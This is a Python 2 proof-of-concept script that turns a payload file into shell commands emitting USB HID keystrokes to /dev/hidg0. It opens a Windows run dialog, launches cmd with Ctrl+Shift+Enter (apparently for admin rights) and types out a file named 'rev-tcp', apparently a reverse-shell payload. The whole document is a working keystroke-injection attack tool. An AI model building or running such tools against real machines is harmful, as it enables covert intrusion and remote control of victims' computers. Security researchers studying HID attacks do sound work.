#!/usr/bin/python

# Formats payload to HID Keyboard sequences. Real rough poc for testing basic payloads.


def findinlist(byte):

# Lowercase
	if   byte=="a": print '''echo -ne "\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="b": print '''echo -ne "\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="c": print '''echo -ne "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="d": print '''echo -ne "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="e": print '''echo -ne "\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="f": print '''echo -ne "\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="g": print '''echo -ne "\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="h": print '''echo -ne "\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="i": print '''echo -ne "\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="j": print '''echo -ne "\\x00\\x00\\x00\\x0d\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="k": print '''echo -ne "\\x00\\x00\\x00\\x0e\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="l": print '''echo -ne "\\x00\\x00\\x00\\x0f\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="m": print '''echo -ne "\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="n": print '''echo -ne "\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="o": print '''echo -ne "\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="p": print '''echo -ne "\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="q": print '''echo -ne "\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="r": print '''echo -ne "\\x00\\x00\\x00\\x15\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="s": print '''echo -ne "\\x00\\x00\\x00\\x16\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="t": print '''echo -ne "\\x00\\x00\\x00\\x17\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="u": print '''echo -ne "\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="v": print '''echo -ne "\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="w": print '''echo -ne "\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="x": print '''echo -ne "\\x00\\x00\\x00\\x1b\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="y": print '''echo -ne "\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="z": print '''echo -ne "\\x00\\x00\\x00\\x1d\\x00\\x00\\x00\\x00" > /dev/hidg0'''

# Uppercase
	elif byte=="A": print '''echo -ne "\\x20\\x00\\x00\\x04\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="B": print '''echo -ne "\\x20\\x00\\x00\\x05\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="C": print '''echo -ne "\\x20\\x00\\x00\\x06\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="D": print '''echo -ne "\\x20\\x00\\x00\\x07\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="E": print '''echo -ne "\\x20\\x00\\x00\\x08\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="F": print '''echo -ne "\\x20\\x00\\x00\\x09\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="G": print '''echo -ne "\\x20\\x00\\x00\\x0a\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="H": print '''echo -ne "\\x20\\x00\\x00\\x0b\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="I": print '''echo -ne "\\x20\\x00\\x00\\x0c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="J": print '''echo -ne "\\x20\\x00\\x00\\x0d\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="K": print '''echo -ne "\\x20\\x00\\x00\\x0e\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="L": print '''echo -ne "\\x20\\x00\\x00\\x0f\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="M": print '''echo -ne "\\x20\\x00\\x00\\x10\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="N": print '''echo -ne "\\x20\\x00\\x00\\x11\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="O": print '''echo -ne "\\x20\\x00\\x00\\x12\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="P": print '''echo -ne "\\x20\\x00\\x00\\x13\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="Q": print '''echo -ne "\\x20\\x00\\x00\\x14\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="R": print '''echo -ne "\\x20\\x00\\x00\\x15\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="S": print '''echo -ne "\\x20\\x00\\x00\\x16\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="T": print '''echo -ne "\\x20\\x00\\x00\\x17\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="U": print '''echo -ne "\\x20\\x00\\x00\\x18\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="V": print '''echo -ne "\\x20\\x00\\x00\\x19\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="W": print '''echo -ne "\\x20\\x00\\x00\\x1a\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="X": print '''echo -ne "\\x20\\x00\\x00\\x1b\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="Y": print '''echo -ne "\\x20\\x00\\x00\\x1c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="Z": print '''echo -ne "\\x20\\x00\\x00\\x1d\\x00\\x00\\x00\\x00" > /dev/hidg0'''

# Numbers
	elif byte=="1": print '''echo -ne "\\x00\\x00\\x00\\x1e\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="2": print '''echo -ne "\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="3": print '''echo -ne "\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="4": print '''echo -ne "\\x00\\x00\\x00\\x21\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="5": print '''echo -ne "\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="6": print '''echo -ne "\\x00\\x00\\x00\\x23\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="7": print '''echo -ne "\\x00\\x00\\x00\\x24\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="8": print '''echo -ne "\\x00\\x00\\x00\\x25\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="9": print '''echo -ne "\\x00\\x00\\x00\\x26\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="0": print '''echo -ne "\\x00\\x00\\x00\\x27\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	#SDLK_RETURN,0x28
	#SDLK_ESCAPE,0x29
	#SDLK_BACKSPACE,0x2a
	#SDLK_TAB,0x2b
	elif byte==" ": print '''echo -ne "\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="-": print '''echo -ne "\\x00\\x00\\x00\\x2d\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="=": print '''echo -ne "\\x00\\x00\\x00\\x2e\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="[": print '''echo -ne "\\x00\\x00\\x00\\x2f\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="]": print '''echo -ne "\\x00\\x00\\x00\\x30\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="\\":print '''echo -ne "\\x00\\x00\\x00\\x31\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte==";": print '''echo -ne "\\x00\\x00\\x00\\x33\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="'": print '''echo -ne "\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="`": print '''echo -ne "\\x00\\x00\\x00\\x35\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte==",": print '''echo -ne "\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte==".": print '''echo -ne "\\x00\\x00\\x00\\x37\\x00\\x00\\x00\\x00" > /dev/hidg0'''

	elif byte=="!": print '''echo -ne "\\x20\\x00\\x00\\x1e\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="@": print '''echo -ne "\\x20\\x00\\x00\\x1f\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="#": print '''echo -ne "\\x20\\x00\\x00\\x20\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="$": print '''echo -ne "\\x20\\x00\\x00\\x21\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="%": print '''echo -ne "\\x20\\x00\\x00\\x22\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="^": print '''echo -ne "\\x20\\x00\\x00\\x23\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="&": print '''echo -ne "\\x20\\x00\\x00\\x24\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="*": print '''echo -ne "\\x20\\x00\\x00\\x25\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="(": print '''echo -ne "\\x20\\x00\\x00\\x26\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte==")": print '''echo -ne "\\x20\\x00\\x00\\x27\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte==":": print '''echo -ne "\\x20\\x00\\x00\\x33\\x00\\x00\\x00\\x00" > /dev/hidg0'''

#Shift chars
	elif byte=="+": print '''echo -ne "\\x20\\x00\\x00\\x2e\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="{": print '''echo -ne "\\x20\\x00\\x00\\x2f\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="}": print '''echo -ne "\\x20\\x00\\x00\\x30\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	elif byte=="\"": print '''echo -ne "\\x20\\x00\\x00\\x34\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	else: print "#crap, couldn't find ["+byte +"]. Perhaps try adding it to the list."

	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''	


# pop up cmd

print '''echo -ne "\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 0.5'''
print '''echo -ne "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 0.5'''
print '''echo -ne "\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 0.5'''
print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 0.5'''

f = open("/sdcard/htdocs/files/rev-tcp", "rb")
try:
    byte = f.read(1)
    while byte != "":
        byte = f.read(1)
	findinlist(byte)

finally:
    f.close()


#Hit enter

print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''



